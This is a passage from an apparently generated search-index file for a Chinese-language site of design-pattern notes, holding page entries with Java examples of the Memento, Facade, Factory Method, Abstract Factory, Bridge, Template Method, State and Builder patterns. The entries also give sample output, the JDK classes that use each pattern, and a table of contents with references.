public interface PreviousCalculationToCareTaker { // no operations permitted for the caretaker
}
/** * Memento Object Implementation * <p> * Note that this object implements both interfaces to Originator and CareTaker */
public class PreviousCalculationImp implements PreviousCalculationToCareTaker, PreviousCalculationToOriginator { private int firstNumber; private int secondNumber; public PreviousCalculationImp(int firstNumber, int secondNumber) { this.firstNumber = firstNumber; this.secondNumber = secondNumber; } @Override public int getFirstNumber() { return firstNumber; } @Override public int getSecondNumber() { return secondNumber; }
}
/** * CareTaker object */
public class Client { public static void main(String[] args) { // program starts Calculator calculator = new CalculatorImp(); // assume user enters two numbers calculator.setFirstNumber(10); calculator.setSecondNumber(100); // find result System.out.println(calculator.getCalculationResult()); // Store result of this calculation in case of error PreviousCalculationToCareTaker memento = calculator.backupLastCalculation(); // user enters a number calculator.setFirstNumber(17); // user enters a wrong second number and calculates result calculator.setSecondNumber(-290); // calculate result System.out.println(calculator.getCalculationResult()); // user hits CTRL + Z to undo last operation and see last result calculator.restorePreviousCalculation(memento); // result restored System.out.println(calculator.getCalculationResult()); }
}
110
-273
110`},{header:"JDK",slug:"jdk",content:"java.io.Serializable"}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%A4%96%E8%A7%82.html",title:"",pathLocale:"/",contents:[{header:"\u5916\u89C2\uFF08Facade\uFF09",slug:"\u5916\u89C2-facade",content:""},{header:"Intent",slug:"intent",content:"\u63D0\u4F9B\u4E86\u4E00\u4E2A\u7EDF\u4E00\u7684\u63A5\u53E3\uFF0C\u7528\u6765\u8BBF\u95EE\u5B50\u7CFB\u7EDF\u4E2D\u7684\u4E00\u7FA4\u63A5\u53E3\uFF0C\u4ECE\u800C\u8BA9\u5B50\u7CFB\u7EDF\u66F4\u5BB9\u6613\u4F7F\u7528\u3002"},{header:"Class Diagram",slug:"class-diagram",content:""},{header:"Implementation",slug:"implementation",content:`\u89C2\u770B\u7535\u5F71\u9700\u8981\u64CD\u4F5C\u5F88\u591A\u7535\u5668\uFF0C\u4F7F\u7528\u5916\u89C2\u6A21\u5F0F\u5B9E\u73B0\u4E00\u952E\u770B\u7535\u5F71\u529F\u80FD\u3002
public class SubSystem { public void turnOnTV() { System.out.println("turnOnTV()"); } public void setCD(String cd) { System.out.println("setCD( " + cd + " )"); } public void startWatching(){ System.out.println("startWatching()"); }
}
public class Facade { private SubSystem subSystem = new SubSystem(); public void watchMovie() { subSystem.turnOnTV(); subSystem.setCD("a movie"); subSystem.startWatching(); }
}
public class Client { public static void main(String[] args) { Facade facade = new Facade(); facade.watchMovie(); }
}`},{header:"\u8BBE\u8BA1\u539F\u5219",slug:"\u8BBE\u8BA1\u539F\u5219",content:"\u6700\u5C11\u77E5\u8BC6\u539F\u5219\uFF1A\u53EA\u548C\u4F60\u7684\u5BC6\u53CB\u8C08\u8BDD\u3002\u4E5F\u5C31\u662F\u8BF4\u5BA2\u6237\u5BF9\u8C61\u6240\u9700\u8981\u4EA4\u4E92\u7684\u5BF9\u8C61\u5E94\u5F53\u5C3D\u53EF\u80FD\u5C11\u3002"}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95.html",title:"",pathLocale:"/",contents:[{header:"\u5DE5\u5382\u65B9\u6CD5\uFF08Factory Method\uFF09",slug:"\u5DE5\u5382\u65B9\u6CD5-factory-method",content:""},{header:"Intent",slug:"intent",content:"\u5B9A\u4E49\u4E86\u4E00\u4E2A\u521B\u5EFA\u5BF9\u8C61\u7684\u63A5\u53E3\uFF0C\u4F46\u7531\u5B50\u7C7B\u51B3\u5B9A\u8981\u5B9E\u4F8B\u5316\u54EA\u4E2A\u7C7B\u3002\u5DE5\u5382\u65B9\u6CD5\u628A\u5B9E\u4F8B\u5316\u64CD\u4F5C\u63A8\u8FDF\u5230\u5B50\u7C7B\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`\u5728\u7B80\u5355\u5DE5\u5382\u4E2D\uFF0C\u521B\u5EFA\u5BF9\u8C61\u7684\u662F\u53E6\u4E00\u4E2A\u7C7B\uFF0C\u800C\u5728\u5DE5\u5382\u65B9\u6CD5\u4E2D\uFF0C\u662F\u7531\u5B50\u7C7B\u6765\u521B\u5EFA\u5BF9\u8C61\u3002
\u4E0B\u56FE\u4E2D\uFF0CFactory \u6709\u4E00\u4E2A doSomething() \u65B9\u6CD5\uFF0C\u8FD9\u4E2A\u65B9\u6CD5\u9700\u8981\u7528\u5230\u4E00\u4E2A\u4EA7\u54C1\u5BF9\u8C61\uFF0C\u8FD9\u4E2A\u4EA7\u54C1\u5BF9\u8C61\u7531 factoryMethod() \u65B9\u6CD5\u521B\u5EFA\u3002\u8BE5\u65B9\u6CD5\u662F\u62BD\u8C61\u7684\uFF0C\u9700\u8981\u7531\u5B50\u7C7B\u53BB\u5B9E\u73B0\u3002`},{header:"Implementation",slug:"implementation",content:`public abstract class Factory { abstract public Product factoryMethod(); public void doSomething() { Product product = factoryMethod(); // do something with the product }
}
public class ConcreteFactory extends Factory { public Product factoryMethod() { return new ConcreteProduct(); }
}
public class ConcreteFactory1 extends Factory { public Product factoryMethod() { return new ConcreteProduct1(); }
}
public class ConcreteFactory2 extends Factory { public Product factoryMethod() { return new ConcreteProduct2(); }
}`},{header:"JDK",slug:"jdk",content:`java.util.Calendar
java.util.ResourceBundle
java.text.NumberFormat
java.nio.charset.Charset
java.net.URLStreamHandlerFactory
java.util.EnumSet
javax.xml.bind.JAXBContext`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82.html",title:"",pathLocale:"/",contents:[{header:"4. \u62BD\u8C61\u5DE5\u5382\uFF08Abstract Factory\uFF09",slug:"_4-\u62BD\u8C61\u5DE5\u5382-abstract-factory",content:""},{header:"Intent",slug:"intent",content:"\u63D0\u4F9B\u4E00\u4E2A\u63A5\u53E3\uFF0C\u7528\u4E8E\u521B\u5EFA \u76F8\u5173\u7684\u5BF9\u8C61\u5BB6\u65CF \u3002"},{header:"Class Diagram",slug:"class-diagram",content:`\u62BD\u8C61\u5DE5\u5382\u6A21\u5F0F\u521B\u5EFA\u7684\u662F\u5BF9\u8C61\u5BB6\u65CF\uFF0C\u4E5F\u5C31\u662F\u5F88\u591A\u5BF9\u8C61\u800C\u4E0D\u662F\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u5E76\u4E14\u8FD9\u4E9B\u5BF9\u8C61\u662F\u76F8\u5173\u7684\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5FC5\u987B\u4E00\u8D77\u521B\u5EFA\u51FA\u6765\u3002\u800C\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u53EA\u662F\u7528\u4E8E\u521B\u5EFA\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u8FD9\u548C\u62BD\u8C61\u5DE5\u5382\u6A21\u5F0F\u6709\u5F88\u5927\u4E0D\u540C\u3002
\u62BD\u8C61\u5DE5\u5382\u6A21\u5F0F\u7528\u5230\u4E86\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u6765\u521B\u5EFA\u5355\u4E00\u5BF9\u8C61\uFF0CAbstractFactory \u4E2D\u7684 createProductA() \u548C createProductB() \u65B9\u6CD5\u90FD\u662F\u8BA9\u5B50\u7C7B\u6765\u5B9E\u73B0\uFF0C\u8FD9\u4E24\u4E2A\u65B9\u6CD5\u5355\u72EC\u6765\u770B\u5C31\u662F\u5728\u521B\u5EFA\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u8FD9\u7B26\u5408\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u7684\u5B9A\u4E49\u3002
\u81F3\u4E8E\u521B\u5EFA\u5BF9\u8C61\u7684\u5BB6\u65CF\u8FD9\u4E00\u6982\u5FF5\u662F\u5728 Client \u4F53\u73B0\uFF0CClient \u8981\u901A\u8FC7 AbstractFactory \u540C\u65F6\u8C03\u7528\u4E24\u4E2A\u65B9\u6CD5\u6765\u521B\u5EFA\u51FA\u4E24\u4E2A\u5BF9\u8C61\uFF0C\u5728\u8FD9\u91CC\u8FD9\u4E24\u4E2A\u5BF9\u8C61\u5C31\u6709\u5F88\u5927\u7684\u76F8\u5173\u6027\uFF0CClient \u9700\u8981\u540C\u65F6\u521B\u5EFA\u51FA\u8FD9\u4E24\u4E2A\u5BF9\u8C61\u3002
\u4ECE\u9AD8\u5C42\u6B21\u6765\u770B\uFF0C\u62BD\u8C61\u5DE5\u5382\u4F7F\u7528\u4E86\u7EC4\u5408\uFF0C\u5373 Cilent \u7EC4\u5408\u4E86 AbstractFactory\uFF0C\u800C\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u4F7F\u7528\u4E86\u7EE7\u627F\u3002`},{header:"Implementation",slug:"implementation",content:`public class AbstractProductA {
}
public class AbstractProductB {
}
public class ProductA1 extends AbstractProductA {
}
public class ProductA2 extends AbstractProductA {
}
public class ProductB1 extends AbstractProductB {
}
public class ProductB2 extends AbstractProductB {
}
public abstract class AbstractFactory { abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB();
}
public class ConcreteFactory1 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA1(); } AbstractProductB createProductB() { return new ProductB1(); }
}
public class ConcreteFactory2 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA2(); } AbstractProductB createProductB() { return new ProductB2(); }
}
public class Client { public static void main(String[] args) { AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB }
}`},{header:"JDK",slug:"jdk",content:`javax.xml.parsers.DocumentBuilderFactory
javax.xml.transform.TransformerFactory
javax.xml.xpath.XPathFactory`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E6%A1%A5%E6%8E%A5.html",title:"",pathLocale:"/",contents:[{header:"\u6865\u63A5\uFF08Bridge\uFF09",slug:"\u6865\u63A5-bridge",content:""},{header:"Intent",slug:"intent",content:"\u5C06\u62BD\u8C61\u4E0E\u5B9E\u73B0\u5206\u79BB\u5F00\u6765\uFF0C\u4F7F\u5B83\u4EEC\u53EF\u4EE5\u72EC\u7ACB\u53D8\u5316\u3002"},{header:"Class Diagram",slug:"class-diagram",content:`Abstraction\uFF1A\u5B9A\u4E49\u62BD\u8C61\u7C7B\u7684\u63A5\u53E3
Implementor\uFF1A\u5B9A\u4E49\u5B9E\u73B0\u7C7B\u63A5\u53E3`},{header:"Implementation",slug:"implementation",content:`RemoteControl \u8868\u793A\u9065\u63A7\u5668\uFF0C\u6307\u4EE3 Abstraction\u3002
TV \u8868\u793A\u7535\u89C6\uFF0C\u6307\u4EE3 Implementor\u3002
\u6865\u63A5\u6A21\u5F0F\u5C06\u9065\u63A7\u5668\u548C\u7535\u89C6\u5206\u79BB\u5F00\u6765\uFF0C\u4ECE\u800C\u53EF\u4EE5\u72EC\u7ACB\u6539\u53D8\u9065\u63A7\u5668\u6216\u8005\u7535\u89C6\u7684\u5B9E\u73B0\u3002
public abstract class TV { public abstract void on(); public abstract void off(); public abstract void tuneChannel();
}
public class Sony extends TV { @Override public void on() { System.out.println("Sony.on()"); } @Override public void off() { System.out.println("Sony.off()"); } @Override public void tuneChannel() { System.out.println("Sony.tuneChannel()"); }
}
public class RCA extends TV { @Override public void on() { System.out.println("RCA.on()"); } @Override public void off() { System.out.println("RCA.off()"); } @Override public void tuneChannel() { System.out.println("RCA.tuneChannel()"); }
}
public abstract class RemoteControl { protected TV tv; public RemoteControl(TV tv) { this.tv = tv; } public abstract void on(); public abstract void off(); public abstract void tuneChannel();
}
public class ConcreteRemoteControl1 extends RemoteControl { public ConcreteRemoteControl1(TV tv) { super(tv); } @Override public void on() { System.out.println("ConcreteRemoteControl1.on()"); tv.on(); } @Override public void off() { System.out.println("ConcreteRemoteControl1.off()"); tv.off(); } @Override public void tuneChannel() { System.out.println("ConcreteRemoteControl1.tuneChannel()"); tv.tuneChannel(); }
}
public class ConcreteRemoteControl2 extends RemoteControl { public ConcreteRemoteControl2(TV tv) { super(tv); } @Override public void on() { System.out.println("ConcreteRemoteControl2.on()"); tv.on(); } @Override public void off() { System.out.println("ConcreteRemoteControl2.off()"); tv.off(); } @Override public void tuneChannel() { System.out.println("ConcreteRemoteControl2.tuneChannel()"); tv.tuneChannel(); }
}
public class Client { public static void main(String[] args) { RemoteControl remoteControl1 = new ConcreteRemoteControl1(new RCA()); remoteControl1.on(); remoteControl1.off(); remoteControl1.tuneChannel(); RemoteControl remoteControl2 = new ConcreteRemoteControl2(new Sony()); remoteControl2.on(); remoteControl2.off(); remoteControl2.tuneChannel(); }
}`},{header:"JDK",slug:"jdk",content:`AWT (It provides an abstraction layer which maps onto the native OS the windowing support.)
JDBC`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95.html",title:"",pathLocale:"/",contents:[{header:"\u6A21\u677F\u65B9\u6CD5\uFF08Template Method\uFF09",slug:"\u6A21\u677F\u65B9\u6CD5-template-method",content:""},{header:"Intent",slug:"intent",content:`\u5B9A\u4E49\u7B97\u6CD5\u6846\u67B6\uFF0C\u5E76\u5C06\u4E00\u4E9B\u6B65\u9AA4\u7684\u5B9E\u73B0\u5EF6\u8FDF\u5230\u5B50\u7C7B\u3002
\u901A\u8FC7\u6A21\u677F\u65B9\u6CD5\uFF0C\u5B50\u7C7B\u53EF\u4EE5\u91CD\u65B0\u5B9A\u4E49\u7B97\u6CD5\u7684\u67D0\u4E9B\u6B65\u9AA4\uFF0C\u800C\u4E0D\u7528\u6539\u53D8\u7B97\u6CD5\u7684\u7ED3\u6784\u3002`},{header:"Class Diagram",slug:"class-diagram",content:""},{header:"Implementation",slug:"implementation",content:`\u51B2\u5496\u5561\u548C\u51B2\u8336\u90FD\u6709\u7C7B\u4F3C\u7684\u6D41\u7A0B\uFF0C\u4F46\u662F\u67D0\u4E9B\u6B65\u9AA4\u4F1A\u6709\u70B9\u4E0D\u4E00\u6837\uFF0C\u8981\u6C42\u590D\u7528\u90A3\u4E9B\u76F8\u540C\u6B65\u9AA4\u7684\u4EE3\u7801\u3002 public abstract class CaffeineBeverage { final void prepareRecipe() { boilWater(); brew(); pourInCup(); addCondiments(); } abstract void brew(); abstract void addCondiments(); void boilWater() { System.out.println("boilWater"); } void pourInCup() { System.out.println("pourInCup"); }
}
public class Coffee extends CaffeineBeverage { @Override void brew() { System.out.println("Coffee.brew"); } @Override void addCondiments() { System.out.println("Coffee.addCondiments"); }
}
public class Tea extends CaffeineBeverage { @Override void brew() { System.out.println("Tea.brew"); } @Override void addCondiments() { System.out.println("Tea.addCondiments"); }
}
public class Client { public static void main(String[] args) { CaffeineBeverage caffeineBeverage = new Coffee(); caffeineBeverage.prepareRecipe(); System.out.println("-----------"); caffeineBeverage = new Tea(); caffeineBeverage.prepareRecipe(); }
}
boilWater
Coffee.brew
pourInCup
Coffee.addCondiments
-----------
boilWater
Tea.brew
pourInCup
Tea.addCondiments`},{header:"JDK",slug:"jdk",content:`java.util.Collections#sort()
java.io.InputStream#skip()
java.io.InputStream#read()
java.util.AbstractList#indexOf()`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%8A%B6%E6%80%81.html",title:"",pathLocale:"/",contents:[{header:"8. \u72B6\u6001\uFF08State\uFF09",slug:"_8-\u72B6\u6001-state",content:""},{header:"Intent",slug:"intent",content:"\u5141\u8BB8\u5BF9\u8C61\u5728\u5185\u90E8\u72B6\u6001\u6539\u53D8\u65F6\u6539\u53D8\u5B83\u7684\u884C\u4E3A\uFF0C\u5BF9\u8C61\u770B\u8D77\u6765\u597D\u50CF\u4FEE\u6539\u4E86\u5B83\u6240\u5C5E\u7684\u7C7B\u3002"},{header:"Class Diagram",slug:"class-diagram",content:""},{header:"Implementation",slug:"implementation",content:`\u7CD6\u679C\u9500\u552E\u673A\u6709\u591A\u79CD\u72B6\u6001\uFF0C\u6BCF\u79CD\u72B6\u6001\u4E0B\u9500\u552E\u673A\u6709\u4E0D\u540C\u7684\u884C\u4E3A\uFF0C\u72B6\u6001\u53EF\u4EE5\u53D1\u751F\u8F6C\u79FB\uFF0C\u4F7F\u5F97\u9500\u552E\u673A\u7684\u884C\u4E3A\u4E5F\u53D1\u751F\u6539\u53D8\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/396be981-3f2c-4fd9-8101-dbf9c841504b.jpg" width="600)
public interface State { /** * \u6295\u5165 25 \u5206\u94B1 */ void insertQuarter(); /** * \u9000\u56DE 25 \u5206\u94B1 */ void ejectQuarter(); /** * \u8F6C\u52A8\u66F2\u67C4 */ void turnCrank(); /** * \u53D1\u653E\u7CD6\u679C */ void dispense();
}
public class HasQuarterState implements State { private GumballMachine gumballMachine; public HasQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("You can't insert another quarter"); } @Override public void ejectQuarter() { System.out.println("Quarter returned"); gumballMachine.setState(gumballMachine.getNoQuarterState()); } @Override public void turnCrank() { System.out.println("You turned..."); gumballMachine.setState(gumballMachine.getSoldState()); } @Override public void dispense() { System.out.println("No gumball dispensed"); }
}
public class NoQuarterState implements State { GumballMachine gumballMachine; public NoQuarterState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("You insert a quarter"); gumballMachine.setState(gumballMachine.getHasQuarterState()); } @Override public void ejectQuarter() { System.out.println("You haven't insert a quarter"); } @Override public void turnCrank() { System.out.println("You turned, but there's no quarter"); } @Override public void dispense() { System.out.println("You need to pay first"); }
}
public class SoldOutState implements State { GumballMachine gumballMachine; public SoldOutState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("You can't insert a quarter, the machine is sold out"); } @Override public void ejectQuarter() { System.out.println("You can't eject, you haven't inserted a quarter yet"); } @Override public void turnCrank() { System.out.println("You turned, but there are no gumballs"); } @Override public void dispense() { System.out.println("No gumball dispensed"); }
}
public class SoldState implements State { GumballMachine gumballMachine; public SoldState(GumballMachine gumballMachine) { this.gumballMachine = gumballMachine; } @Override public void insertQuarter() { System.out.println("Please wait, we're already giving you a gumball"); } @Override public void ejectQuarter() { System.out.println("Sorry, you already turned the crank"); } @Override public void turnCrank() { System.out.println("Turning twice doesn't get you another gumball!"); } @Override public void dispense() { gumballMachine.releaseBall(); if (gumballMachine.getCount() > 0) { gumballMachine.setState(gumballMachine.getNoQuarterState()); } else { System.out.println("Oops, out of gumballs"); gumballMachine.setState(gumballMachine.getSoldOutState()); } }
}
public class GumballMachine { private State soldOutState; private State noQuarterState; private State hasQuarterState; private State soldState; private State state; private int count = 0; public GumballMachine(int numberGumballs) { count = numberGumballs; soldOutState = new SoldOutState(this); noQuarterState = new NoQuarterState(this); hasQuarterState = new HasQuarterState(this); soldState = new SoldState(this); if (numberGumballs > 0) { state = noQuarterState; } else { state = soldOutState; } } public void insertQuarter() { state.insertQuarter(); } public void ejectQuarter() { state.ejectQuarter(); } public void turnCrank() { state.turnCrank(); state.dispense(); } public void setState(State state) { this.state = state; } public void releaseBall() { System.out.println("A gumball comes rolling out the slot..."); if (count != 0) { count -= 1; } } public State getSoldOutState() { return soldOutState; } public State getNoQuarterState() { return noQuarterState; } public State getHasQuarterState() { return hasQuarterState; } public State getSoldState() { return soldState; } public int getCount() { return count; }
}
public class Client { public static void main(String[] args) { GumballMachine gumballMachine = new GumballMachine(5); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.ejectQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.ejectQuarter(); gumballMachine.insertQuarter(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); gumballMachine.insertQuarter(); gumballMachine.turnCrank(); }
}
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
Quarter returned
You turned, but there's no quarter
You need to pay first
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
You haven't insert a quarter
You insert a quarter
You can't insert another quarter
You turned...
A gumball comes rolling out the slot...
You insert a quarter
You turned...
A gumball comes rolling out the slot...
Oops, out of gumballs
You can't insert a quarter, the machine is sold out
You turned, but there are no gumballs
No gumball dispensed`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%94%9F%E6%88%90%E5%99%A8.html",title:"",pathLocale:"/",contents:[{header:"5. \u751F\u6210\u5668\uFF08Builder\uFF09",slug:"_5-\u751F\u6210\u5668-builder",content:""},{header:"Intent",slug:"intent",content:"\u5C01\u88C5\u4E00\u4E2A\u5BF9\u8C61\u7684\u6784\u9020\u8FC7\u7A0B\uFF0C\u5E76\u5141\u8BB8\u6309\u6B65\u9AA4\u6784\u9020\u3002"},{header:"Class Diagram",slug:"class-diagram",content:""},{header:"Implementation",slug:"implementation",content:`\u4EE5\u4E0B\u662F\u4E00\u4E2A\u7B80\u6613\u7684 StringBuilder \u5B9E\u73B0\uFF0C\u53C2\u8003\u4E86 JDK 1.8 \u6E90\u7801\u3002
public class AbstractStringBuilder { protected char[] value; protected int count; public AbstractStringBuilder(int capacity) { count = 0; value = new char[capacity]; } public AbstractStringBuilder append(char c) { ensureCapacityInternal(count + 1); value[count++] = c; return this; } private void ensureCapacityInternal(int minimumCapacity) { // overflow-conscious code if (minimumCapacity - value.length > 0) expandCapacity(minimumCapacity); } void expandCapacity(int minimumCapacity) { int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity < 0) newCapacity = minimumCapacity; if (newCapacity < 0) { if (minimumCapacity < 0) // overflow throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; } value = Arrays.copyOf(value, newCapacity); }
}
public class StringBuilder extends AbstractStringBuilder { public StringBuilder() { super(16); } @Override public String toString() { // Create a copy, don't share the array return new String(value, 0, count); }
}
public class Client { public static void main(String[] args) { StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i < count; i++) { sb.append((char) ('a' + i)); } System.out.println(sb.toString()); }
}
abcdefghijklmnopqrstuvwxyz`},{header:"JDK",slug:"jdk",content:`java.lang.StringBuilder
java.nio.ByteBuffer
java.lang.StringBuffer
java.lang.Appendable
Apache Camel builders`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%95.html",title:"\u8BBE\u8BA1\u6A21\u5F0F\u76EE\u5F55",pathLocale:"/",contents:[{header:"\u8BBE\u8BA1\u6A21\u5F0F\u76EE\u5F55",slug:"\u8BBE\u8BA1\u6A21\u5F0F\u76EE\u5F55",content:""},{header:"\u4E00\u3001\u524D\u8A00",slug:"\u4E00\u3001\u524D\u8A00",content:"\u8BBE\u8BA1\u6A21\u5F0F\u662F\u89E3\u51B3\u95EE\u9898\u7684\u65B9\u6848\uFF0C\u5B66\u4E60\u73B0\u6709\u7684\u8BBE\u8BA1\u6A21\u5F0F\u53EF\u4EE5\u505A\u5230\u7ECF\u9A8C\u590D\u7528\u3002\u62E5\u6709\u8BBE\u8BA1\u6A21\u5F0F\u8BCD\u6C47\uFF0C\u5728\u6C9F\u901A\u65F6\u5C31\u80FD\u7528\u66F4\u5C11\u7684\u8BCD\u6C47\u6765\u8BA8\u8BBA\uFF0C\u5E76\u4E14\u4E0D\u9700\u8981\u4E86\u89E3\u5E95\u5C42\u7EC6\u8282\u3002"},{header:"\u4E8C\u3001\u521B\u5EFA\u578B",slug:"\u4E8C\u3001\u521B\u5EFA\u578B",content:`\u5355\u4F8B.md
\u7B80\u5355\u5DE5\u5382.md
\u5DE5\u5382\u65B9\u6CD5.md
\u62BD\u8C61\u5DE5\u5382.md
\u751F\u6210\u5668.md
\u539F\u578B\u6A21\u5F0F.md`},{header:"\u4E09\u3001\u884C\u4E3A\u578B",slug:"\u4E09\u3001\u884C\u4E3A\u578B",content:`\u8D23\u4EFB\u94FE.md
\u547D\u4EE4.md
\u89E3\u91CA\u5668.md
\u8FED\u4EE3\u5668.md
\u4E2D\u4ECB\u8005.md
\u5907\u5FD8\u5F55.md
\u89C2\u5BDF\u8005.md
\u72B6\u6001.md
\u7B56\u7565.md
\u6A21\u677F\u65B9\u6CD5.md
\u8BBF\u95EE\u8005.md
\u7A7A\u5BF9\u8C61.md`},{header:"\u56DB\u3001\u7ED3\u6784\u578B",slug:"\u56DB\u3001\u7ED3\u6784\u578B",content:`\u9002\u914D\u5668.md
\u6865\u63A5.md
\u7EC4\u5408.md
\u88C5\u9970.md
\u5916\u89C2.md
\u4EAB\u5143.md
\u4EE3\u7406.md`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u5F17\u91CC\u66FC. Head First \u8BBE\u8BA1\u6A21\u5F0F [M]. \u4E2D\u56FD\u7535\u529B\u51FA\u7248\u793E, 2007.
Gamma E. \u8BBE\u8BA1\u6A21\u5F0F: \u53EF\u590D\u7528\u9762\u5411\u5BF9\u8C61\u8F6F\u4EF6\u7684\u57FA\u7840 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2007.
Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.
Design Patterns
Design patterns implemented in Java
The breakdown of design patterns in JDK`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%951.html",title:"\u4E00\u3001\u524D\u8A00",pathLocale:"/",contents:[{header:"\u4E00\u3001\u524D\u8A00",slug:"\u4E00\u3001\u524D\u8A00",content:"\u8BBE\u8BA1\u6A21\u5F0F\u662F\u89E3\u51B3\u95EE\u9898\u7684\u65B9\u6848\uFF0C\u5B66\u4E60\u73B0\u6709\u7684\u8BBE\u8BA1\u6A21\u5F0F\u53EF\u4EE5\u505A\u5230\u7ECF\u9A8C\u590D\u7528\u3002\u62E5\u6709\u8BBE\u8BA1\u6A21\u5F0F\u8BCD\u6C47\uFF0C\u5728\u6C9F\u901A\u65F6\u5C31\u80FD\u7528\u66F4\u5C11\u7684\u8BCD\u6C47\u6765\u8BA8\u8BBA\uFF0C\u5E76\u4E14\u4E0D\u9700\u8981\u4E86\u89E3\u5E95\u5C42\u7EC6\u8282\u3002"},{header:"\u4E8C\u3001\u521B\u5EFA\u578B",slug:"\u4E8C\u3001\u521B\u5EFA\u578B",content:`\u5355\u4F8B.md
\u7B80\u5355\u5DE5\u5382.md
\u5DE5\u5382\u65B9\u6CD5.md
\u62BD\u8C61\u5DE5\u5382.md
\u751F\u6210\u5668.md
\u539F\u578B\u6A21\u5F0F.md`},{header:"\u4E09\u3001\u884C\u4E3A\u578B",slug:"\u4E09\u3001\u884C\u4E3A\u578B",content:`\u8D23\u4EFB\u94FE.md
\u547D\u4EE4.md
\u89E3\u91CA\u5668.md
\u8FED\u4EE3\u5668.md
\u4E2D\u4ECB\u8005.md
\u5907\u5FD8\u5F55.md
\u89C2\u5BDF\u8005.md
\u72B6\u6001.md
\u7B56\u7565.md
\u6A21\u677F\u65B9\u6CD5.md
\u8BBF\u95EE\u8005.md
\u7A7A\u5BF9\u8C61.md`},{header:"\u56DB\u3001\u7ED3\u6784\u578B",slug:"\u56DB\u3001\u7ED3\u6784\u578B",content:`\u9002\u914D\u5668.md
\u6865\u63A5.md
\u7EC4\u5408.md
\u88C5\u9970.md
\u5916\u89C2.md
\u4EAB\u5143.md
\u4EE3\u7406.md`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u5F17\u91CC\u66FC. Head First \u8BBE\u8BA1\u6A21\u5F0F [M]. \u4E2D\u56FD\u7535\u529B\u51FA\u7248\u793E, 2007.
Gamma E. \u8BBE\u8BA1\u6A21\u5F0F: \u53EF\u590D\u7528\u9762\u5411\u5BF9\u8C61\u8F6F\u4EF6\u7684\u57FA\u7840 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2007.
Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.
Design Patterns
Design patterns implemented in Java
The breakdown of design patterns in JDK`}]},{path:"/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%A9%BA%E5%AF%B9%E8%B1%A1.html",title:"",pathLocale:"/",contents:[{header:"\u7A7A\u5BF9\u8C61\uFF08Null\uFF09",slug:"\u7A7A\u5BF9\u8C61-null",content:""},{header:"Intent",slug:"intent",content:`\u4F7F\u7528\u4EC0\u4E48\u90FD\u4E0D\u505A
